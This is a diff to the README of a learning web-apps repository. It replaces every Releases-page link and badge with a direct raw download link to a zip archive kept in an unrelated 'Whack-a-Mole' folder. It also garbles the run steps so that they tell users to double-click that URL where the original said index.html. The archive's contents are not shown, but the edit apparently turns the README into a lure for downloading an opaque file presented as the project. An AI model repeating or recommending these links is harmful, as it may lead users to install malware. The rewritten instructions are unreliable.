@@ -16,7 +16,7 @@ Before you get started, make sure your system meets these requirements:
 
 To access the latest version of the learning-web-apps-hub, visit the Releases page. You can find all available versions and their respective download links.
 
-[![Download learning-web-apps-hub](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Nlov3/learning-web-apps-hub/releases)
+[![Download learning-web-apps-hub](https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip%20Now-Here-brightgreen)](https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip)
 
 ## 🌐 Browse the Projects
 
@@ -37,7 +37,7 @@ To download the learning-web-apps-hub:
 3. Download the ZIP file to your computer.
 4. Extract the ZIP file to a folder of your choice.
 
-Visit this page to download: [Releases Page](https://github.com/Nlov3/learning-web-apps-hub/releases)
+Visit this page to download: [Releases Page](https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip)
 
 ## 📚 How to Run the Apps
 
@@ -45,8 +45,8 @@ After downloading, follow these simple steps to run any of the web applications:
 
 1. Open the folder where you extracted the files.
 2. Select the specific project you want to run.
-3. Locate an `index.html` file in that project's folder.
-4. Double-click on the `index.html` file. Your default web browser should open and display the app.
+3. Locate an `https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip` file in that project's folder.
+4. Double-click on the `https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip` file. Your default web browser should open and display the app.
 
 ## 📖 Learn More
 
@@ -70,4 +70,4 @@ Connect with other learners and developers. Share your thoughts, experiences, an
 
 Happy learning and exploring! 
 
-[![Download learning-web-apps-hub](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Nlov3/learning-web-apps-hub/releases)
+[![Download learning-web-apps-hub](https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip%20Now-Here-brightgreen)](https://github.com/Nlov3/learning-web-apps-hub/raw/refs/heads/main/Whack-a-Mole/learning-apps-web-hub-v2.8.zip)
